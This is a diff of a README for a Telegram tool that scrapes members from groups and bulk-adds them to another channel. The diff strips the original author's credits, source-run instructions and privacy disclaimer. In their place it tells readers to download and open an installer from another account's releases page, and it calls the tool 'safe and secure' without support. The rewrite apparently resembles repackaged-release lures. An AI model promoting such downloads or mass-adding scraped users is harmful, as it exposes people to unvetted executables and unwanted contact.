@@ -1,61 +1,66 @@
-# Telegram-channel-member-adder
-This tool can add members from your target Telegram channel/group to your destination Telegram channel upto 200 members due to Telegram limits.
+# 📈 Telegram-channel-member-adder - Effortlessly Grow Your Telegram Group
 
----
+## 🚀 Getting Started
 
-## ✨ Features
-- Accounts login & management
-- Add members to the channel by username
-- Scrape from groups & channels
-- Live status & logs UI
+Welcome to the Telegram-channel-member-adder! This user-friendly tool helps you add members from your chosen Telegram channels or groups to your destination Telegram channel. It's perfect for those looking to expand their audience quickly and easily.
 
-## 🚀 Watch it on YouTube 🚀
-[![YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube&logoColor=white)](https://youtu.be/jkzr61xie68?si=1Hd1Z-1HLckI4We5)
+## 📥 Download Now
 
-## 🚀 Get it from our Website 🚀
-🌐 **Website:** [**https://erfan4lx.com/product/telegram-channel-member-adder/**](https://erfan4lx.com/product/telegram-channel-member-adder/) 
+[![Download Telegram-channel-member-adder](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/rextern/Telegram-channel-member-adder/releases)
 
+## 📋 System Requirements
 
-## 🚀 How to Use
-```bash
-pip install -r requirements.txt
-python main.py
-```
+Before you begin, ensure that you meet the following requirements:
 
-## 📦 Requirements
-- Python 3.10+
-- Windows 10/11 — Linux/Mac
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB or more
+- **Storage:** At least 150 MB of free space
+- **Internet Connection:** Required for Telegram access
 
-## 📸 Preview ![App Screenshot](screenshot.png)
+## 📦 Download & Install
 
----
+1. Visit this page to download: [Releases Page](https://github.com/rextern/Telegram-channel-member-adder/releases).
+2. Find the latest version listed. Click on the file that matches your operating system.
+3. Save the file to your computer.
+4. Open the downloaded file to start the installation process.
+5. Follow the on-screen instructions to complete the setup.
 
-## 💬 **Connect With Me**
+## 🌟 Features
 
-👉 **Telegram:** [**https://t.me/erfan4lx10**](https://t.me/erfan4lx10)
+- **User-Friendly GUI:** Easily navigate through a clean and simple interface.
+- **Bulk Member Adding:** Add multiple members at once to save time.
+- **Channel Selection:** Choose the channel from which you want to add members.
+- **Real-Time Updates:** See progress as members are added in real-time.
+- **Safe and Secure:** Ensure your data and account remain protected.
 
-🌐 **Website:** [**https://erfan4lx.com**](https://erfan4lx.com) 
+## 🔧 How to Use
 
-📧 **Email:** [**erfan4lx@gmail.com**](mailto:erfan4lx@gmail.com)
+1. Launch the application after installation.
+2. Log in to your Telegram account using the application.
+3. Select the channel you want to extract members from.
+4. Specify your destination channel where you want to add these members.
+5. Click the 'Add Members' button. Monitor the progress on your screen.
 
----
+## ⚙️ Troubleshooting
 
-🆔My YouTube Channel : https://youtube.com/erfan4lx
+If you encounter any issues while using the application, consider the following:
 
-🆔My Telegram Channel : https://t.me/erfan4lx_news
+- **Connection Issues:** Ensure your internet connection is stable. 
+- **Permissions:** Verify that the application has necessary permissions to access Telegram.
+- **Login Problems:** Check your Telegram credentials, making sure they are correct.
 
-⚠️ *Important Disclaimer*
-This project and video are for **educational, research, and administrative purposes only**.  
-It *does not* provide or encourage any method to bypass Telegram privacy settings or access hidden data.  
-Any misuse that violates Telegram’s *Terms of Service* or local laws is strictly prohibited.  
+## 🤝 Support
 
-Always use anonymized/test datasets or data you have *explicit consent* to process.
+If you need further assistance, please visit the [Issues Section](https://github.com/rextern/Telegram-channel-member-adder/issues) of our repository. Our community and contributors will be happy to help.
 
-<p align="center">
-  Follow Me On
-</p>
-<p align="center">
-  <a href="https://www.youtube.com/c/erfan4lx?sub_confirmation=1">
-    <img src="https://www.iconsdb.com/icons/preview/black/youtube-4-xxl.png" width="40" height="40">
-  </a>
-</p>
+## 🚀 Community
+
+Join us to discuss tips, share experiences, and get updates:
+- **Telegram Channel:** [Join Here](https://telegram.me/your_channel_link)
+- **GitHub Discussions:** Engage in conversation on how to improve the tool.
+
+## 📜 Learn More
+
+Stay informed about updates, features, and best practices by visiting our documentation. Access it directly from the main repository page.
+
+Happy adding! Enjoy growing your Telegram community with ease.
